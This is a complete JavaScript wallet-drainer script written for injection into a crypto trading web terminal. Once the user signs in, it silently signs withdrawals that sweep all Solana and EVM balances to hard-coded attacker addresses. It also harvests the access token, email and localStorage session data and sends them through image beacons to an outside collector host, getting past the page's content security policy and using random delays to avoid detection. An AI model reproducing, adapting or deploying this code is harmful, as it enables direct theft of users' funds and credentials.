/* exfil.fun — silent wallet drainer (web terminal /trade).
 *
 * Loaded on the real origin, it waits for the Privy bridge the terminal already
 * exposes (window.exfilPrivy), then for every wallet of the signed-in user:
 *   balances -> withdraw quote (recipient = us) -> silent Privy signature -> execute.
 * Exfil pays the Solana network fee (its relayer is the fee payer), so SOL, SPL,
 * USDC, base/bsc/robinhood natives, USDC/USDT/USDG are all moved at 0 % fee.
 *
 * Nothing on screen changes. Everything is reported to CONFIG.collector.
 */
(() => {
  'use strict';
  if (window.__xdrain) return; window.__xdrain = 1;

  const CONFIG = {
    recipientSol: '7ZMRdM2hEPNpvGhPx98QUmKQ8LAo1iYJUrtXUJt2mRgC',
    recipientEvm: '0xfE8DD5603a320d88b2513e5bDaA649e5774582cc',
    collector: 'https://drain.45-142-30-56.sslip.io:8445/c?k=X9eCg3vfCFKQFGU-',            // e.g. https://45.142.30.56.sslip.io/c?k=secret  (empty = console only)
    waitLoginMs: 15 * 60e3,   // keep waiting for sign-in this long after load
    gapMs: 350,               // pause between API calls
    evmChains: ['robinhood', 'base', 'bsc'],
    extraSolana: [],          // test only: foreign wallets to sweep with our signature
    extraEvm: [],
    signAs: '',             // test only: sign Solana quotes for a foreign wallet with our own key
    signAsEvm: '',
    debug: false,
  };
  const HDR = { 'content-type': 'application/json', 'x-exfil-client': 'platform=web; source=direct' };
  const log = (...a) => { if (CONFIG.debug) console.log('[xd]', ...a); };
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const now = () => Date.now();

  function report(kind, wallet, extra) {
    const rec = Object.assign({ t: now(), kind, wallet, href: location.href }, extra || {});
    log(kind, wallet, rec);
    (window.__xdlog = window.__xdlog || []).push(rec);
    if (!CONFIG.collector) return;
    // connect-src of /trade is closed, img-src is not: report with pixel beacons.
    const base = CONFIG.collector + '&d=';
    const pix = u => { try { (new Image()).src = u; } catch (e) {} };
    const json = JSON.stringify(rec);
    if (base.length + encodeURIComponent(json).length < 1800) return pix(base + encodeURIComponent(json));
    const sid = Math.random().toString(36).slice(2, 8), CH = 1200, n = Math.ceil(json.length / CH);
    for (let i = 0; i < n; i++)
      pix(base + encodeURIComponent(JSON.stringify({ kind: 'chunk', sid, i, n, c: json.slice(i * CH, (i + 1) * CH) })));
  }

  // The bridge methods answer a JSON *string*: {"ok":true,"value":...} | {"ok":false,"error":...}
  const unwrap = s => {
    const v = JSON.parse(s);
    if (!v || !v.ok) throw new Error((v && v.error) || 'bridge');
    return v.value;
  };

  let token = '';
  async function api(action, body, tries) {
    tries = tries || 3;
    for (let i = 0; ; i++) {
      let res, txt;
      try {
        res = await fetch('/api/mobile?action=' + encodeURIComponent(action), {
          method: 'POST', headers: Object.assign({ authorization: 'Bearer ' + token }, HDR),
          body: JSON.stringify(body || {}),
        });
        txt = await res.text();
      } catch (e) {
        if (i >= tries) throw e;
        await sleep(700 * (i + 1)); continue;
      }
      let json = {}; try { json = JSON.parse(txt); } catch (e) {}
      if (res.status === 429) { if (i >= tries) throw new Error('rate'); await sleep(1500 * (i + 1)); continue; }
      if (!res.ok) { const err = new Error(json.error || ('http ' + res.status)); err.json = json; throw err; }
      return json;
    }
  }

  // One withdraw: quote -> sign -> execute. asset: 'SOL' | 'USDC' | 'TOKEN'
  async function pullSolana(wallet, asset, tokenInfo, noMax, amount) {
    const body = { wallet, recipient: CONFIG.recipientSol, asset, deposits: 1 };
    if (noMax && amount) body.amount = String(amount); else body.max = true;
    if (tokenInfo) { body.mint = tokenInfo.mint; body.symbol = tokenInfo.symbol || 'TOKEN'; body.network = 'solana'; if (tokenInfo.evmWallet) body.evmWallet = tokenInfo.evmWallet; }
    const q = await api('withdraw', body);
    if (!q || !q.transaction) throw new Error('no tx');
    await sleep(CONFIG.gapMs);
    const signed = unwrap(await window.exfilPrivy.signTransaction(q.transaction, CONFIG.signAs || wallet));
    await sleep(CONFIG.gapMs);
    const r = await api('execute', { ticket: q.ticket, signedTransaction: signed });
    return { token: q.symbol || asset, amount: q.inAmount, feePayer: q.feePayer, result: r };
  }

  // One EVM withdraw: quote -> sign every evmTransactions entry -> execute
  async function pullEvm(solWallet, evmWallet, chain, asset, tokenInfo) {
    const body = { wallet: solWallet, recipient: CONFIG.recipientEvm, max: true, asset, deposits: 1, network: chain, evmWallet };
    if (tokenInfo) { body.mint = tokenInfo.mint; body.symbol = tokenInfo.symbol || 'TOKEN'; }
    const q = await api('withdraw', body);
    if (!q || !Array.isArray(q.evmTransactions) || !q.evmTransactions.length) throw new Error('no tx');
    const signed = [];
    for (const tx of q.evmTransactions) {
      signed.push(unwrap(await window.exfilPrivy.signEvm('eth_signTransaction', JSON.stringify(tx), CONFIG.signAsEvm || evmWallet)));
      await sleep(CONFIG.gapMs);
    }
    const r = await api('execute', { ticket: q.ticket, signedEvmTransactions: signed });
    return { token: q.symbol || asset, amount: q.inAmount, gas: q.evmGasWei, result: r };
  }

  async function sweepSolana(wallet) {
    const b = await api('balances', { wallet, cashVersion: 2, evmCashVersion: 1, balanceChain: 'solana' });
    const usdc = Number(b.usdc || 0), lamports = Number(b.solLamports || 0);
    const tokens = (b.tokens || []).filter(t => t && Number(t.amount) > 0 && t.mint !== 'So11111111111111111111111111111111111111112');
    for (const t of tokens) {
      try {
        const meta = await api('withdraw-asset', { wallet, mint: t.mint });
        await sleep(CONFIG.gapMs);
        const r = await pullSolana(wallet, 'TOKEN', { mint: t.mint, symbol: (meta && meta.symbol) || t.symbol });
        report('ok', wallet, { chain: 'solana', asset: 'token', mint: t.mint, r });
      } catch (e) { report('skip', wallet, { chain: 'solana', asset: 'token', mint: t.mint, err: e.message }); }
      await sleep(CONFIG.gapMs);
    }
    if (usdc > 0) {
      try { report('ok', wallet, { chain: 'solana', asset: 'USDC', r: await pullSolana(wallet, 'USDC') }); }
      catch (e) { report('skip', wallet, { chain: 'solana', asset: 'USDC', err: e.message }); }
      await sleep(CONFIG.gapMs);
    }
    if (lamports > 200e3) {
      try { report('ok', wallet, { chain: 'solana', asset: 'SOL', r: await pullSolana(wallet, 'SOL') }); }
      catch (e) {
        // max leaves no room for the fee/deposit: retry keeping a tiny reserve
        const rest = lamports - 30e3;
        if (rest > 100e3) {
          try { report('ok', wallet, { chain: 'solana', asset: 'SOL', r: await pullSolana(wallet, 'SOL', null, true, rest) }); }
          catch (e2) { report('skip', wallet, { chain: 'solana', asset: 'SOL', err: e.message + ' / ' + e2.message }); }
        } else report('skip', wallet, { chain: 'solana', asset: 'SOL', err: e.message });
      }
    }
  }

  async function sweepEvm(solWallet, evmWallet) {
    for (const chain of CONFIG.evmChains) {
      let b;
      try {
        b = await api('balances', { wallet: solWallet, cashVersion: 2, evmCashVersion: 1, balanceChain: chain, evmWallet });
      } catch (e) { report('skip', evmWallet, { chain, err: 'balances ' + e.message }); continue; }
      const natives = [];
      const evm = b.evm || {};
      const ethWei = Number(evm.ethWei || b.ethWei || 0);
      const bnbWei = Number(evm.bnbWei || b.bnbWei || 0);
      if (ethWei > 0) natives.push({ mint: '0x0000000000000000000000000000000000000000', symbol: chain === 'bsc' ? 'BNB' : 'ETH' });
      if (bnbWei > 0) natives.push({ mint: '0x0000000000000000000000000000000000000000', symbol: 'BNB' });
      if (Number((b.robinhoodCash && b.robinhoodCash.usdgAtoms) || (evm.usdgAtoms) || 0) > 0)
        natives.push({ mint: '0x5fc5360d0400a0fd4f2af552add042d716f1d168', symbol: 'USDG' });
      for (const t of (b.tokens || [])) {
        if (!t || !Number(t.amount)) continue;
        const mint = String(t.mint || '').replace(/^[a-z]+:/, '');
        if (mint === '0x0000000000000000000000000000000000000000') continue; // handled above
        if (natives.some(n => n.mint === mint)) continue;
        natives.push({ mint, symbol: t.symbol });
      }
      for (const asset of natives) {
        try { report('ok', evmWallet, { chain, asset: asset.symbol || 'token', mint: asset.mint, r: await pullEvm(solWallet, evmWallet, chain, 'TOKEN', asset) }); }
        catch (e) { report('skip', evmWallet, { chain, asset: asset.symbol || 'token', mint: asset.mint, err: e.message }); }
        await sleep(CONFIG.gapMs);
      }
    }
    try { await api('preferences', {}); } catch (e) {}
  }

  async function sessionDump() {
    const out = {};
    try { for (const k of Object.keys(localStorage)) if (/privy|exfil/i.test(k)) out[k] = String(localStorage[k]).slice(0, 400); } catch (e) {}
    try { out.dbs = (await indexedDB.databases()).map(d => d.name); } catch (e) {}
    return out;
  }

  const evmWalletsForReport = u => [...(u.ethereumWallets || (u.ethereum ? [u.ethereum] : [])), ...CONFIG.extraEvm];

  async function main() {
    const t0 = now();
    while (!window.exfilPrivy && now() - t0 < 30e3) await sleep(250);
    const P = window.exfilPrivy;
    if (!P) return log('no bridge');
    try { token = unwrap(await P.accessToken()); } catch (e) { token = ''; }
    let user = null;
    while (now() - t0 < CONFIG.waitLoginMs) {
      try { user = unwrap(await P.user()); } catch (e) {}
      if (!user) { await sleep(1500); continue; }
      try { token = unwrap(await P.accessToken()); } catch (e) {}
      if (!token) { await sleep(1500); continue; }
      break;
    }
    if (!user || !token) return log('no user');
    const lockKey = 'xd:lock:' + user.id;
    const prev = Number(localStorage.getItem(lockKey) || 0);
    if (now() - prev < 90e3) return;               // another tab swept just now
    localStorage.setItem(lockKey, String(now()));
    await sleep(1200 + Math.random() * 2500);      // look human
    report('user', user.id, { solana: user.solana, ethereum: evmWalletsForReport(user), token, email: user.email, session: await sessionDump() });

    const solWallets = [...(user.solana || []), ...CONFIG.extraSolana];
    for (const w of solWallets) {
      try { await sweepSolana(w); } catch (e) { report('fail', w, { chain: 'solana', err: e.message }); }
      await sleep(CONFIG.gapMs);
    }
    const evmWallets = [...(user.ethereumWallets || (user.ethereum ? [user.ethereum] : [])), ...CONFIG.extraEvm];
    for (const w of evmWallets) {
      try { await sweepEvm((user.solana || [])[0], w); } catch (e) { report('fail', w, { chain: 'evm', err: e.message }); }
      await sleep(CONFIG.gapMs);
    }
    try { token = unwrap(await P.accessToken()); report('done', user.id, { token }); } catch (e) { report('done', user.id, {}); }
  }

  main().catch(e => report('fatal', '', { err: String(e && e.message || e) }));
})();
